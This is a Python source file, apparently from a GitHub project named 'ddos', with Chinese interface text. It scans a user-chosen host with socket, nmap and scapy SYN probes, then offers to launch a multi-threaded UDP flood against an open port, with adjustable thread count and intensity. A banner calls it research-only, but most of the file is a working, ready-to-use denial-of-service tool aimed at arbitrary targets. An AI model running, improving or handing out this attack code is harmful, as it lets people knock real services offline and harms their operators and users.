import socket
import threading
import nmap
from scapy.all import sr1, IP, TCP
import sys
import os
import time
import random
from datetime import datetime
import ctypes


# ================== 功能函数定义 ==================
def print_start_message():
    """显示启动信息"""
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

    print(r"""
  ____  ____   ___  ____  
 |  _ \|  _ \ / _ \/ ___| 
 | | | | | | | | | \___ \ 
 | |_| | |_| | |_| |___) |
 |____/|____/ \___/|____/ 
    """)
    print(r"/---------------------------------------------------\\")
    print(r"|     GitHub项目: https://github.com/gkszz/ddos       |")
    print(r"|         	     仅供技术研究使用                	      |")
    print(r"|          请遵守当地法律法规，禁止非法用途               |")
    print(r"\---------------------------------------------------/")
    print(r" -----------------[网络安全警示]----------------- ")


# ================== 全局配置 ==================
COLOR = {
    "RED": '\033[91m',
    "GREEN": '\033[92m',
    "YELLOW": '\033[93m',
    "BLUE": '\033[94m',
    "RESET": '\033[0m'
}

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
    443: "HTTPS", 1433: "MSSQL", 3306: "MySQL",
    3389: "RDP", 8888: "Custom"
}


# ================== DNS解析功能 ==================
def resolve_dns(hostname, max_retries=3):
    """DNS解析功能，带自动重试和刷新DNS"""
    for attempt in range(max_retries):
        try:
            print(f"{COLOR['BLUE']}[+] 正在解析域名: {hostname}{COLOR['RESET']}")
            ip = socket.gethostbyname(hostname)
            print(f"{COLOR['GREEN']}[√] 解析成功: {hostname} -> {ip}{COLOR['RESET']}")
            return ip
        except socket.gaierror:
            print(f"{COLOR['YELLOW']}[!] DNS解析失败，尝试刷新DNS ({attempt + 1}/{max_retries}){COLOR['RESET']}")
            flush_dns()
            time.sleep(2)
    return None


def flush_dns():
    """刷新DNS缓存"""
    if os.name == 'nt':
        print(f"{COLOR['BLUE']}[+] 正在刷新DNS缓存 (ipconfig /flushdns){COLOR['RESET']}")
        os.system('ipconfig /flushdns >nul 2>&1')
    else:
        print(f"{COLOR['BLUE']}[+] 正在刷新DNS缓存 (systemd-resolve --flush-caches){COLOR['RESET']}")
        os.system('systemd-resolve --flush-caches >/dev/null 2>&1')


# ================== 核心功能类 ==================
class PortScanner:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.ports = list(COMMON_PORTS.keys())
        self.results = {port: {} for port in self.ports}

    def native_scan(self):
        """原生Socket扫描"""
        print(f"{COLOR['BLUE']}[+] 正在进行原生端口扫描...{COLOR['RESET']}")

        def _check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3)
                    result = s.connect_ex((self.target_ip, port))
                    self.results[port]['Native'] = "开放" if result == 0 else "关闭"
            except Exception as e:
                self.results[port]['Native'] = f"错误: {e}"

        threads = []
        for port in self.ports:
            t = threading.Thread(target=_check_port, args=(port,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

    def nmap_scan(self):
        """NMAP扫描"""
        print(f"{COLOR['BLUE']}[+] 正在进行NMAP扫描...{COLOR['RESET']}")
        try:
            nm = nmap.PortScanner()
            if not nm.has_nmap():
                raise nmap.PortScannerError("nmap未安装")

            scan_result = nm.scan(
                hosts=self.target_ip,
                ports=','.join(map(str, self.ports)),
                arguments='-T4'
            )

            for port in self.ports:
                try:
                    state = scan_result['scan'][self.target_ip]['tcp'][port]['state']
                    self.results[port]['Nmap'] = "开放" if state == 'open' else "关闭"
                except KeyError:
                    self.results[port]['Nmap'] = "未知"

        except nmap.PortScannerError as e:
            print(f"{COLOR['RED']}[!] NMAP错误: {e}{COLOR['RESET']}")
            print(f"{COLOR['YELLOW']}请访问 https://nmap.org/download.html 安装nmap{COLOR['RESET']}")
            for p in self.ports:
                self.results[p]['Nmap'] = '失败'

    def syn_scan(self):
        """SYN半开放扫描"""
        print(f"{COLOR['BLUE']}[+] 正在进行SYN扫描...{COLOR['RESET']}")
        if os.name == 'nt':
            print(f"{COLOR['YELLOW']}[!] Windows系统需要安装Npcap来支持SYN扫描！{COLOR['RESET']}")

        for port in self.ports:
            try:
                packet = IP(dst=self.target_ip) / TCP(dport=port, flags="S")
                response = sr1(packet, timeout=1, verbose=0)

                if response and response.haslayer(TCP):
                    if response[TCP].flags == 0x12:  # SYN-ACK
                        self.results[port]['SYN'] = "开放"
                    else:
                        self.results[port]['SYN'] = "关闭"
                else:
                    self.results[port]['SYN'] = "过滤"
            except Exception as e:
                self.results[port]['SYN'] = f"错误: {str(e)}"

    def show_results(self):
        """显示扫描结果"""
        print(f"\n{COLOR['BLUE']}=== 扫描结果汇总 ==={COLOR['RESET']}")
        open_ports = []
        for port in self.ports:
            status = self.results[port]
            port_status = f"端口 {port} ({COMMON_PORTS.get(port, '未知')}): "
            port_status += " | ".join([f"{k}: {v}" for k, v in status.items()])

            if any('开放' in str(v) for v in status.values()):
                print(f"{COLOR['GREEN']}{port_status}{COLOR['RESET']}")
                open_ports.append(port)
            else:
                print(f"{COLOR['RED']}{port_status}{COLOR['RESET']}")

        return open_ports


class DDOSController:
    def __init__(self, target_ip, port):
        self.target_ip = target_ip
        self.port = port
        self.stop_event = threading.Event()
        self.stats = {
            'start_time': time.time(),
            'packets': 0,
            'bytes': 0
        }

    def start_attack(self, threads=10, speed=500):
        """启动DDOS攻击"""
        print(f"\n{COLOR['YELLOW']}[!] 启动DDOS攻击 {self.target_ip}:{self.port}{COLOR['RESET']}")
        print(f"{COLOR['YELLOW']}[!] 按Ctrl+C停止攻击{COLOR['RESET']}")

        workers = []
        for _ in range(threads):
            t = threading.Thread(target=self._attack_worker, args=(speed,))
            workers.append(t)
            t.start()

        try:
            while not self.stop_event.is_set():
                self._show_stats()
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_event.set()

        for t in workers:
            t.join()

        self._show_final_stats()

    def _attack_worker(self, speed):
        """攻击线程"""
        data = random._urandom(1024)  # 1KB数据包
        while not self.stop_event.is_set():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(data, (self.target_ip, self.port))
                    self.stats['packets'] += 1
                    self.stats['bytes'] += len(data)
                    time.sleep((1000 - speed) / 1000)
            except Exception as e:
                print(f"{COLOR['RED']}[!] 发送错误: {e}{COLOR['RESET']}")

    def _show_stats(self):
        """显示实时统计"""
        duration = time.time() - self.stats['start_time']
        print(f"{COLOR['BLUE']}[+] 已发送 {self.stats['packets']} 包 - "
              f"速率 {self.stats['packets'] / max(duration, 1):.1f} pps - "
              f"总计 {self.stats['bytes'] // 1024} KB{COLOR['RESET']}")

    def _show_final_stats(self):
        """显示最终统计"""
        duration = time.time() - self.stats['start_time']
        print(f"\n{COLOR['YELLOW']}=== 攻击统计 ===")
        print(f"持续时间: {duration:.1f} 秒")
        print(f"总包数: {self.stats['packets']}")
        print(f"总数据量: {self.stats['bytes'] // 1024} KB")
        print(f"平均速率: {self.stats['packets'] / max(duration, 1):.1f} 包/秒{COLOR['RESET']}")


# ================== HTTP分析功能 ==================
def http_analysis(target_ip):
    """HTTP状态码分析"""
    print(f"{COLOR['BLUE']}[+] 正在测试HTTP连接...{COLOR['RESET']}")

    try:
        # 尝试建立HTTP连接
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((target_ip, 80))
            print(f"{COLOR['GREEN']}[√] HTTP连接成功{COLOR['RESET']}")
    except:
        print(f"{COLOR['RED']}[!] HTTP连接失败，跳过分析{COLOR['RESET']}")
        return

    status_codes = {
        100: ("继续", "客户端应继续其请求"),
        200: ("成功", "请求已成功处理"),
        301: ("永久重定向", "资源已永久移动"),
        302: ("临时重定向", "资源暂时移动"),
        404: ("未找到", "请求的资源不存在"),
        500: ("服务器错误", "服务器内部错误"),
        503: ("服务不可用", "服务器暂时过载或维护")
    }

    while True:
        code = input("\n输入HTTP状态码 (q退出): ").strip()
        if code.lower() == 'q':
            break
        try:
            code = int(code)
            if code in status_codes:
                desc, solution = status_codes[code]
                print(f"{COLOR['GREEN']}[+] {code} {desc}: {solution}{COLOR['RESET']}")
            else:
                print(f"{COLOR['YELLOW']}[!] 未知状态码: {code}{COLOR['RESET']}")
        except ValueError:
            print(f"{COLOR['RED']}[!] 无效输入，请输入数字{COLOR['RESET']}")


# ================== 主程序逻辑 ==================
def main():
    print_start_message()

    while True:  # 主循环保持程序持续运行
        try:
            # 权限检查
            if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
                print(f"{COLOR['RED']}[!] 部分功能需要管理员权限，建议以管理员身份运行{COLOR['RESET']}")

            # 目标输入和DNS解析
            target = input("\n目标地址(IP/域名，输入q退出): ").strip()
            if target.lower() == 'q':
                break

            # DNS解析
            if not target.replace('.', '').isdigit():
                target_ip = resolve_dns(target)
                if not target_ip:
                    continue
            else:
                target_ip = target

            # 端口扫描
            scanner = PortScanner(target_ip)
            scanner.native_scan()
            scanner.nmap_scan()
            scanner.syn_scan()
            open_ports = scanner.show_results()

            # DDOS攻击
            if open_ports:
                choice = input("\n是否启动DDOS攻击？(y/n): ").lower().strip()
                if choice == 'y':
                    try:
                        port = int(input(f"选择攻击端口 {open_ports}: "))
                        if port not in open_ports:
                            raise ValueError
                    except:
                        port = 80
                        print(f"{COLOR['YELLOW']}[!] 使用默认端口80{COLOR['RESET']}")

                    threads = 10
                    speed = 500
                    try:
                        threads = int(input("线程数 (默认10): ") or 10)
                        speed = int(input("攻击强度 (100-1000，默认500): ") or 500)
                        speed = max(100, min(1000, speed))
                    except:
                        print(f"{COLOR['YELLOW']}[!] 使用默认参数{COLOR['RESET']}")

                    DDOSController(target_ip, port).start_attack(threads, speed)

            # HTTP分析
            if input("\n是否进行HTTP状态分析？(y/n): ").lower().strip() == 'y':
                http_analysis(target_ip)

        except Exception as e:
            print(f"{COLOR['RED']}[!] 发生错误: {e}{COLOR['RESET']}")

    print(f"\n{COLOR['BLUE']}[+] 程序已退出{COLOR['RESET']}")


if __name__ == "__main__":
    main()